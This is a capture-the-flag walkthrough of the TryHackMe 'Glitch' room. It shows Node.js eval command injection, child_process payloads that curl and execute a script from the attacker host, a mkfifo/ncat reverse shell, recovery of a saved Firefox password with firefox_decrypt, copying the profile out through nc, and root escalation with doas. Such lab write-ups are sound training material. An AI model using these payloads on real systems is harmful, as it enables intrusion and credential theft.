```bash
# PLATFORM          . THM
# CTF NAME          . GLITCH
# DESCRIPTION       . Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/glitch
```

```
sudo nmap -sSVC -T5 -p- 10.10.84.58 -oN glitch
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Navigating to the website, we get just a static image and the page title "not allowed."

- In the source code, we find the following

```javascript
function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
```

- If we navigate to `http://10.10.84.58/api/access` we get

```
{"token":"dGhpc19pc19ub3RfcmVhbA=="}
```

- This is base64 encoded. If we enter the decoded value as the value for `token` cookie on the main page, we get access to another page.

- If we inspect the source code this time, we find a `script.js` file at the end

```javascript
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items')
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {
        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.errors.forEach((element) => {
        let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.deaths.forEach((element) => {
        let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
    });

  const buttons = document.querySelectorAll('.btn');
  const items = document.querySelectorAll('.item');
  buttons.forEach((button) => {
    button.addEventListener('click', (event) => {
      event.preventDefault();
      const filter = event.target.innerText;
      items.forEach((item) => {
        if (filter === 'all') {
          item.style.display = 'flex';
        } else {
          if (item.classList.contains(filter)) {
            item.style.display = 'flex';
          } else {
            item.style.display = 'none';
          }
        }
      });
    });
  });
})();
```

- Again, let's go to `http://10.10.84.58/api/items`

```
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

- Here I was stuck for a while. I noticed that if we navigate to `/api/arandomvaluethatdoesntexist` we get 

```
Cannot GET /api/arandomvaluethatdoesntexist
```

- I've decided to play around in Burp Suite and after a while I've tried using POST instead of GET for the `/api/items`.

```
{"message":"there_is_a_glitch_in_the_matrix"}
```

- I've tried path traversal thinking that I can access other endpoints than `/api/access` and I even tried directory fuzzing.

- However, as I later figured out, all I had to do was to try and append `?cmd=` after `/api/access`.

- Here's how the final request should look like

```
POST /api/items?cmd=ls HTTP/1.1
Host: 10.10.84.58
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=this_is_not_real
Connection: close
```

- But take a look af what we get as an answer

```
ReferenceError: ls is not defined  
    at eval (eval at router.post (/var/web/routes/api.js:25:60), <anonymous>:1:1)  
    at router.post (/var/web/routes/api.js:25:60)  
    at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)  
    at next (/var/web/node_modules/express/lib/router/route.js:137:13)  
    at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)  
    at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)  
    at /var/web/node_modules/express/lib/router/index.js:281:22  
    at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)  
    at next (/var/web/node_modules/express/lib/router/index.js:275:10)  
    at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)
```

- Line two in particular is suggesting that this is failing at `eval()`. 
- Other paths in the error sugges that this server is running node js.

- So we might able to run node js commands.

- After some research, I came with the following conclusions

```
require("child_process").exec("curl IP/shell.sh > /tmp/shell.sh")
require("child_process").exec("/bin/sh /tmp/shell.sh")
```

- We could use the first command to get the `shell.sh` script from our host and write it to `/tmp/shell.sh`.
- We could use the second command to execute it.

- However, I've quickly found out that I actually need to URL-encode the commands, so they became

```
require(%22child_process%22).exec(%22curl%20IP/shell.sh%20%3E%20/tmp/shell.sh%22)
require(%22child_process%22).exec(%22/bin/sh%20/tmp/shell.sh%22)
```

- After ages of trial and error, the working reverse shell is

```shell.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u ip 3131 >/tmp/f
```

___

- First flag is in `/home/user/user.txt`

#### PRIVILEGE ESCALATION user --- user -> v0id

- In our home directory, there's `.firefox` directory and has full permissions to it.

- This is not common and I've assumed it had something to do with our privilege escalation vector, but I kept looking for something else as I had no idea what to do with the content of `.firefox`.

- I've checked other sources since I was really stuck here and I've found out that we can use a script called [firefox_decrypt](https://github.com/unode/firefox_decrypt)

- I've downloaded it locally and cd'ed into the directory.
- Then, I've started a python3 http.server and from the target host I used wget to get the entire directory recursively

```
wget --recursive --no-parent http://IP:8000/firefox_decrypt .
```

```
python firefox_decrypt.py ~/.firefox/b5w4643p.default-release/
```

```
Master Password for profile .firefox/b5w4643p.default-release/: 
2021-05-18 11:04:58,388 - WARNING - Attempting decryption with no Master Password

Website:   https://glitch.thm
Username: 'v0id'
Password: 'l{REDACTED}d'
```

- Another way is to transfer the `b5w4643p.default-release` to the attack box using nc

SENDING

```
tar -cf - . | nc IP PORT
```

RECEIVING

```
nc -nvlp PORT | tar -xf -
```

- Then, start firefox using `firefox --profile /path/to/b5w4643p.default-release`

- After firefox started, head to `about:logins` in the URL bar.

___

#### PRIVILEGE ESCALATION --- v0id -> root

- I found the following binary when looking for privilege escalation paths for `user`.  

```
/usr/local/bin/doas
```

- We can abuse this by using it like this

```
doas -u root /bin/bash
```

- The last flag is in `/root/root.txt`.

